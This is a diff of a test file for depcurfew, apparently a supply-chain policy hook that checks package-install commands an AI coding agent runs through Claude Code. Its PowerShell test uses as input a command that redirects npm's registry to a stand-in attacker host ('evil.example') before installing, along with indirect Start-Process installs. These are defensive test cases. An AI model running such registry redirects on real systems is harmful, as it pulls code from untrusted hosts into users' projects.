@@ -123,14 +123,14 @@ describe('depcurfew check', () => {
     expect([result.code, result.stderr]).toEqual([EXIT_FAILURE, '']);
     expect(JSON.parse(result.stdout)).toEqual({
       schemaVersion: 1,
-      policy: join(directory, 'depcurfew.json'),
+      policy: 'depcurfew.json',
       packages: [],
       notices: [],
       errors: [
         {
           code: 'policy-invalid',
           level: 'error',
-          location: { file: join(directory, 'depcurfew.json') },
+          location: { file: 'depcurfew.json' },
           message: 'depcurfew.json is invalid',
           fix: 'Fix these problems in depcurfew.json; an editor that reads its $schema shows them as you type',
           issues: ['version: must be 1, got 2'],
@@ -158,7 +158,7 @@ describe('depcurfew check --hook claude-code', () => {
       hookEventName: 'PreToolUse',
       permissionDecision: 'deny',
       permissionDecisionReason:
-        "depcurfew blocked this command because it breaks the project's supply-chain policy (depcurfew.json):\n- esbuild: esbuild@0.28.2 runs install scripts (postinstall: node install.js) that depcurfew.json does not allow\nChoose another package or version. Only the user may change depcurfew.json: ask them instead of editing it.",
+        "depcurfew blocked this command because it breaks the project's supply-chain policy (depcurfew.json):\n- esbuild: esbuild@0.28.2 runs install scripts (postinstall) that depcurfew.json does not allow\nChoose another package or version. Only the user may change depcurfew.json: ask them instead of editing it.",
     });
   });
 
@@ -210,6 +210,31 @@ describe('depcurfew check --hook claude-code', () => {
   it('ignores other tools and events', async () => {
     const result = await exec(['check', '--hook', 'claude-code'], event('npm install esbuild', project({}), 'Write'));
     expect(result).toEqual({ code: EXIT_OK, stdout: '', stderr: '' });
+  });
+
+  it('reads the commands of the Monitor tool, and lets a WebSocket watch through', async () => {
+    const directory = project({ cooldown: { minimum: '3d' } });
+    const denied = await exec(['check', '--hook', 'claude-code'], event('npm i this-package-does-not-exist-xyz-123 && tail -f log', directory, 'Monitor'));
+    expect(decision(denied.stdout)).toMatchObject({ permissionDecision: 'deny' });
+    const socket = JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Monitor', tool_input: { ws: { url: 'wss://example.com/feed' } }, cwd: directory });
+    expect(await exec(['check', '--hook', 'claude-code'], socket)).toEqual({ code: EXIT_OK, stdout: '', stderr: '' });
+  });
+
+  it('reads the commands of the PowerShell tool, the main shell on Windows', async () => {
+    const directory = project({ cooldown: { minimum: '3d' } });
+    const hook = (command: string) => exec(['check', '--hook', 'claude-code'], event(command, directory, 'PowerShell'));
+    const denied = await hook('pnpm add lodash; npm i this-package-does-not-exist-xyz-123');
+    expect(decision(denied.stdout)).toMatchObject({ permissionDecision: 'deny' });
+    expect(decision(denied.stdout).permissionDecisionReason).toContain('- this-package-does-not-exist-xyz-123: this-package-does-not-exist-xyz-123 does not exist in the registry');
+    const asked = await hook("Start-Process -Wait npm -ArgumentList 'i lodash'");
+    expect(decision(asked.stdout)).toMatchObject({ permissionDecision: 'ask' });
+    expect(decision(asked.stdout).permissionDecisionReason).toBe(
+      "depcurfew cannot vouch for what this command installs:\n- Start-Process -Wait npm -ArgumentList 'i lodash': depcurfew does not read \"Start-Process\" in PowerShell, and the statement names npm. Fix: Run the package manager as a plain command with the package names written out (no variables, (...), {...}, Start-Process or aliases), so depcurfew can check them",
+    );
+    expect(decision((await hook('$env:npm_config_registry = "https://evil.example"; npm i lodash')).stdout)).toMatchObject({ permissionDecision: 'ask' });
+    expect((await hook("& 'C:\\Program Files\\nodejs\\npm.cmd' install lodash")).stdout).toBe('');
+    expect((await hook('git status; Get-ChildItem -Recurse | Where-Object { $_.Length -gt 1kb }')).stdout).toBe('');
+    expect((await hook('npm run build 2>$null; if ($LASTEXITCODE -ne 0) { exit 1 }')).stdout).toBe('');
   });
 
   it('finds depcurfew.json in a parent of the working directory, inside the same git repository', async () => {
